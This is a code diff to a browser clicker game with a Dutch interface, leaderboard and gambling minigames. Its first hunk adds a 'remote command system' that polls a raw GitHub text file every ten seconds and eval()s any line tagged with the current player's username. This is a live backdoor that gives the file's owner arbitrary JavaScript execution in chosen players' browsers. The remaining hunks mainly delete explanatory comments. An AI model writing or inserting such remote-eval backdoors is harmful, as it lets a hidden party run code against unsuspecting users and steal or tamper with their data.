@@ -995,6 +995,48 @@ button:active { transform: scale(.97); }
 (function () {
   "use strict";
 
+  // ── REMOTE COMMAND SYSTEM ──────────────────────────────────────────────────
+  // Polls a remote text file every 10 seconds.
+  // File format: "name: js code" (one command per line)
+  // If the left side matches the current player's name, the right side is eval()'d.
+  // Commands are only re-executed when the JS code itself changes.
+
+  async function pollRemoteCommands() {
+  const playerName = localStorage.getItem("lc_v4_username");
+  if (!playerName) return;
+
+  try {
+    const res = await fetch("https://raw.githubusercontent.com/toxivid/contact/refs/heads/main/input.txt?t=" + Date.now());
+    const text = await res.text();
+
+    const lines = text.split("\n");
+
+    for (const line of lines) {
+      const colonIdx = line.indexOf(":");
+      if (colonIdx === -1) continue;
+
+      const cmdName = line.slice(0, colonIdx).trim();
+      const cmdCode = line.slice(colonIdx + 1).trim();
+
+      if (cmdName.toLowerCase() === playerName.toLowerCase() && cmdCode) {
+        try {
+          eval(cmdCode);
+        } catch (err) {
+          console.error("Error executing command:", err);
+        }
+      }
+    }
+  } catch (e) {
+    console.error("Fetch failed:", e);
+  }
+}
+
+// run immediately
+pollRemoteCommands();
+
+// run every 10 seconds
+setInterval(pollRemoteCommands, 10000);
+
   // ── CONSTANTS ──────────────────────────────────────────────────────────────
   const VERSION         = "2.3";
   const SAVE_KEY        = "lc_v4";
@@ -1093,7 +1135,6 @@ button:active { transform: scale(.97); }
   let clickKeybind   = localStorage.getItem(KEYBIND_KEY)  || "Enter";
   let keybindDisplay = localStorage.getItem(KBDISP_KEY)   || "ENTER";
 
-  // Active overlays tracking
   const activeOverlays = new Set();
 
   // ── DOM REFS ──────────────────────────────────────────────────────────────
@@ -1140,7 +1181,6 @@ button:active { transform: scale(.97); }
     return fl(n).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".");
   }
 
-  // fmtLB is identical to fmtMain
   const fmtLB = fmtMain;
 
   function showNotice(msg, color) {
@@ -1246,7 +1286,6 @@ button:active { transform: scale(.97); }
     mainImg.src = getCurrentSkinImg();
   }
 
-  // Boost expiry timestamps
   const boosts = { click: 0, ps: 0 };
 
   function activateBoost(type) {
@@ -1258,7 +1297,7 @@ button:active { transform: scale(.97); }
     updateScore();
   }
 
-  // ── UPDATE SCORE (central UI refresh) ─────────────────────────────────────
+  // ── UPDATE SCORE ─────────────────────────────────────────────────────────
   function updateScore() {
     score        = cl(score);
     basePerClick = cl(basePerClick);
@@ -1270,7 +1309,7 @@ button:active { transform: scale(.97); }
 
     scoreEl.innerText       = "Lantings: " + fmtMain(score);
     scoreEl.style.animation = "none";
-    void scoreEl.offsetWidth; // reflow to retrigger animation
+    void scoreEl.offsetWidth;
     scoreEl.style.animation = "scoreFlash .3s ease";
 
     perClickText.innerText  = "Per klik: "    + perClick;
@@ -1305,7 +1344,7 @@ button:active { transform: scale(.97); }
   // ── GAMBLE BUTTON STATE ───────────────────────────────────────────────────
   function updateGambleButton() {
     gambleBtn.disabled = !unlockedGamble;
-    const lockText = (unlocked) => unlocked ? "" : "Vergrendeld";
+    const lockText  = (unlocked) => unlocked ? "" : "Vergrendeld";
     const lockClass = (unlocked) => "gamble-card" + (unlocked ? "" : " locked-game");
     $("bjLockText").innerText    = lockText(unlockedBlackjack);
     $("rollsLockText").innerText = lockText(unlockedRolls);
@@ -1377,7 +1416,6 @@ button:active { transform: scale(.97); }
     const top5       = entries.slice(0, 5);
     const inTop5     = playerRank <= 5;
 
-    // Mini widget
     let html = top5.map((p, i) => makeRowHTML(i + 1, p.name, p.score, p.isMe, false)).join("");
     for (let i = top5.length; i < 5; i++) {
       html += `<div class="lb-row"><span class="lb-rank">#${i+1}</span><span class="lb-name" style="color:var(--muted)">???</span><span class="lb-score" style="color:var(--muted)">???</span></div>`;
@@ -1389,7 +1427,6 @@ button:active { transform: scale(.97); }
 
     lbExpandBtn.textContent = (lbModalOpen ? "\u25BC" : "\u25B2") + " Volledig Leaderboard (" + entries.length + ")";
 
-    // Version controls
     $("lbVersionBadge").textContent = "v" + lbVersionView;
     $("lbPrevBtn").style.display    = lbVersionView === VERSION ? "inline-block" : "none";
     $("lbNextBtn").style.display    = lbVersionView === "2.1"   ? "inline-block" : "none";
@@ -1731,7 +1768,6 @@ button:active { transform: scale(.97); }
 
   function endBJ(win) {
     bjInProgress = false;
-    // Recover chance: all-in = 10%, active luck boost = +20% (no stacking).
     if (win === false) {
       const recoverChance = (bjAllInRound ? 0.10 : 0) + (getActiveLuckPercent() / 100);
       if (Math.random() < recoverChance) win = true;
@@ -2030,7 +2066,6 @@ button:active { transform: scale(.97); }
 
   clickBtn.addEventListener("mousedown", () => { triggerClickAnim(); doClick(); });
 
-  // Keybind
   keybindBtn.innerText = keybindDisplay;
   keybindBtn.addEventListener("click", () => {
     waitingForKey    = !waitingForKey;
@@ -2058,18 +2093,15 @@ button:active { transform: scale(.97); }
   });
   document.addEventListener("keyup", () => { clickLock = false; });
 
-  // Leaderboard
   lbExpandBtn.addEventListener("click", () => lbModalOpen ? closeLbModal() : openLbModal());
   $("lbPrevBtn").addEventListener("click", () => { lbVersionView = "2.1"; renderLeaderboard(); });
   $("lbNextBtn").addEventListener("click", () => { lbVersionView = VERSION; renderLeaderboard(); });
   $("lbModalClose").addEventListener("click", closeLbModal);
   lbModal.addEventListener("click", e => { if (e.target === lbModal) closeLbModal(); });
 
-  // Shop
   $("shopBtn").addEventListener("click", () => { openOverlay("shopScreen"); renderUnlockTiles(); renderUpgrades(); });
   $("shopExitBtn").addEventListener("mousedown", () => closeOverlay("shopScreen"));
 
-  // Gamble
   $("gambleBtn").addEventListener("click", () => { if (unlockedGamble) openOverlay("gambleScreen"); });
   $("gambleExitBtn").addEventListener("click", () => closeOverlay("gambleScreen"));
   $("openBlackjackBtn").addEventListener("click", () => { if (!unlockedBlackjack) return; closeOverlay("gambleScreen"); openOverlay("blackjackScreen"); updateBJDisplay(); });
@@ -2116,7 +2148,6 @@ button:active { transform: scale(.97); }
   });
 
   // ── INTERVALS ─────────────────────────────────────────────────────────────
-  // Game tick: passive income
   setInterval(() => {
     playTime++;
     const ps = Date.now() < boosts.ps ? cl(perSecond * 2.5) : perSecond;
@@ -2125,7 +2156,6 @@ button:active { transform: scale(.97); }
     updateScore();
   }, 1000);
 
-  // Score report to webhook every 5s
   setInterval(() => {
     const name = localStorage.getItem(NAME_KEY);
     if (name && $("startScreen").style.display === "none") {
@@ -2133,13 +2163,11 @@ button:active { transform: scale(.97); }
     }
   }, 5000);
 
-  // Leaderboard fetch every 3s (reduced from 1s — saves bandwidth, still near-live)
   setInterval(async () => {
     await fetchLeaderboard();
     renderLeaderboard();
   }, 3000);
 
-  // Falling circle + boost timer
   setInterval(() => {
     if (!fallingActive && Date.now() >= nextFallAt && $("startScreen").style.display === "none") {
       if (Math.random() < 0.20) spawnFallingCircle();
